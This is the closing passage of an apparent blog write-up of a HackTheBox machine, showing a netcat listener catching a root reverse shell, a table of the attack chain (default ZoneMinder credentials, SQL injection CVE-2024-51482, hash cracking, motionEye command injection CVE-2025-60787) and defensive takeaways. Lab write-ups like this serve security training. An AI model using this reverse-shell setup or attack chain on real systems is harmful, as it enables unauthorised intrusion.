+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.15.36] from (UNKNOWN) [10.129.26.87] 47142</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (5054): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@cctv:/etc/motioneye# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@cctv:/etc/motioneye#</span><br></pre></td></tr></table></figure>
+
+<p><code>whoami</code> → <code>root</code>. Full system compromise.</p>
+<hr>
+<h2 id="Security-Impact"><a href="#Security-Impact" class="headerlink" title="Security Impact"></a>Security Impact</h2><p>This attack chain demonstrates how multiple low-to-medium severity issues combine into a critical compromise:</p>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Technique</th>
+<th>CVE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Initial access</strong></td>
+<td>Default credentials (<code>admin:admin</code>) on ZoneMinder</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Credential exposure</strong></td>
+<td>Time-based blind SQL injection in <code>tid</code> parameter</td>
+<td>CVE-2024-51482</td>
+</tr>
+<tr>
+<td><strong>Account compromise</strong></td>
+<td>Weak password, bcrypt hash cracked via hashcat + rockyou.txt</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Attack surface expansion</strong></td>
+<td>Localhost-only motionEye service reachable post-SSH via tunnel</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Remote code execution as root</strong></td>
+<td>Client-side-only validation bypass → command injection in filename field</td>
+<td>CVE-2025-60787</td>
+</tr>
+</tbody></table>
+<p>This shows how chaining vulnerabilities is often more dangerous than individual flaws, as attackers rarely rely on a single point of failure.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul>
+<li><strong>Default credentials are still a top-tier real-world risk.</strong> Any publicly exposed admin panel with unchanged defaults is an instant foothold.</li>
+<li><strong>Never build raw SQL from user input.</strong> <code>$sql = &quot;SELECT * FROM Events_Tags WHERE TagId = $tagId&quot;</code> is all it takes — parameterized queries would have closed CVE-2024-51482 entirely.</li>
+<li><strong>Localhost-bound services aren’t inherently safe.</strong> Once any form of shell access (even a low-privilege one) is achieved, “internal-only” services become part of the attack surface.</li>
+<li><strong>Client-side validation is not a security control.</strong> motionEye’s filename sanitization lived entirely in JavaScript — trivially bypassed from the browser console. The server must re-validate everything it will later execute or interpret.</li>
+<li><strong>Never let a privileged process (<code>motion</code> as root) act on unsanitized, attacker-influenced config values.</strong></li>
+</ul>
+<hr>
+<p>Have a nice day, and see you in the next writeup!<br>Any feedback in the comments section is very appreciated. 🙏</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/0xkoat">Youssef Kessentini</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://kessentini-youssef.dev/2026/07/11/CCTV/">https://kessentini-youssef.dev/2026/07/11/CCTV/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HackTheBox/">HackTheBox</a><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/SQL-Injection/">SQL Injection</a><a class="post-meta__tags" href="/tags/CVE-2024-51482/">CVE-2024-51482</a><a class="post-meta__tags" href="/tags/CVE-2025-60787/">CVE-2025-60787</a><a class="post-meta__tags" href="/tags/ZoneMinder/">ZoneMinder</a><a class="post-meta__tags" href="/tags/motionEye/">motionEye</a><a class="post-meta__tags" href="/tags/Command-Injection/">Command Injection</a><a class="post-meta__tags" href="/tags/Default-Creds/">Default Creds</a><a class="post-meta__tags" href="/tags/Credential-Cracking/">Credential Cracking</a></div><div class="post-share"><div class="social-share" data-image="/img/cctv-cover.png" data-sites="x,reddit,telegram,email"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/07/01/Path-Traversal/" title="Path Traversal"><img class="cover" src="/img/path-traversal-cover.png" onerror="onerror=null;src='/img/banner.png'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Path Traversal</div></div><div class="info-2"><div class="info-item-1">What I learned after completing Path Traversal path in Portswigger</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/25/WingData/" title="WingData"><img class="cover" src="/img/wingdata-cover.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-25</div><div class="info-item-2">WingData</div></div><div class="info-2"><div class="info-item-1">HTB Easy Linux machine — Wing FTP RCE via Null Byte Injection (CVE-2025-47812), credential harvesting, and root via Python tarfile symlink bypass (CVE-2025-4517)</div></div></div></a><a class="pagination-related" href="/2026/06/20/Dark-Runes/" title="Dark Runes"><img class="cover" src="/img/dark-runes-cover.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-20</div><div class="info-item-2">Dark Runes</div></div><div class="info-2"><div class="info-item-1">HTB Web challenge — Admin registration, 4-digit brute force, and Local File Inclusion via PhantomJS PDF rendering</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/avatar.png'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Youssef Kessentini</div><div class="author-info-description">Security researcher & CTF player. Escalating privileges one machine at a time.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/0xkoat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #ffffff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/public/users/3132736" target="_blank" title="HackTheBox"><i class="fas fa-cube" style="color: #9fef00;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/kessentini-youssef-pro/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0077b5;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">🚩 New writeups every week! HTB machines, CTF challenges, and more.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Reconnaissance"><span class="toc-number">2.</span> <span class="toc-text">1. Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Exploitation-%E2%80%94-CVE-2024-51482-ZoneMinder-Time-Based-SQLi"><span class="toc-number">3.</span> <span class="toc-text">2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-Cause"><span class="toc-number">3.1.</span> <span class="toc-text">Root Cause</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-the-Database"><span class="toc-number">3.2.</span> <span class="toc-text">Dumping the Database</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Cracking-and-Lateral-Movement"><span class="toc-number">4.</span> <span class="toc-text">3. Cracking and Lateral Movement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Privilege-Escalation-%E2%80%94-CVE-2025-60787-motionEye-Command-Injection"><span class="toc-number">5.</span> <span class="toc-text">4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-Cause-1"><span class="toc-number">5.1.</span> <span class="toc-text">Root Cause</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Bypass"><span class="toc-number">5.2.</span> <span class="toc-text">The Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Triggering-Root"><span class="toc-number">5.3.</span> <span class="toc-text">Triggering Root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Impact"><span class="toc-number">6.</span> <span class="toc-text">Security Impact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Takeaways"><span class="toc-number">7.</span> <span class="toc-text">Key Takeaways</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/07/11/CCTV/" title="CCTV"><img src="/img/cctv-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="CCTV"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/07/11/CCTV/" title="CCTV">CCTV</a><time datetime="2026-07-11T16:30:00.000Z" title="Created 2026-07-11 17:30:00">2026-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/01/Path-Traversal/" title="Path Traversal"><img src="/img/path-traversal-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="Path Traversal"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/07/01/Path-Traversal/" title="Path Traversal">Path Traversal</a><time datetime="2026-07-01T15:51:00.000Z" title="Created 2026-07-01 16:51:00">2026-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/25/WingData/" title="WingData"><img src="/img/wingdata-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="WingData"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/06/25/WingData/" title="WingData">WingData</a><time datetime="2026-06-25T11:00:00.000Z" title="Created 2026-06-25 12:00:00">2026-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/20/Dark-Runes/" title="Dark Runes"><img src="/img/dark-runes-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="Dark Runes"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/06/20/Dark-Runes/" title="Dark Runes">Dark Runes</a><time datetime="2026-06-20T19:00:00.000Z" title="Created 2026-06-20 20:00:00">2026-06-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/11/SQL-Injection/" title="SQL Injection"><img src="/img/Generated%20Image%20June%2012,%202026%20-%207_00PM.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="SQL Injection"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/06/11/SQL-Injection/" title="SQL Injection">SQL Injection</a><time datetime="2026-06-11T19:38:25.000Z" title="Created 2026-06-11 20:38:25">2026-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Youssef Kessentini</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div><div class="footer_custom_text"><span>root@reversekoatshell:~#&nbsp;</span><span style="color:#9fef00">_</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (true) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (true) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '0xkoat/reverse-koat-shell',
+      'data-repo-id': 'R_kgDOSzIULQ',
+      'data-category-id': 'DIC_kwDOSzIULc4C--IV',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !true) {
+    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,255,0" opacity="0.15" zIndex="-1" count="80" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search writeups, machines, flags..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5-b1"></script></div></div></body></html>
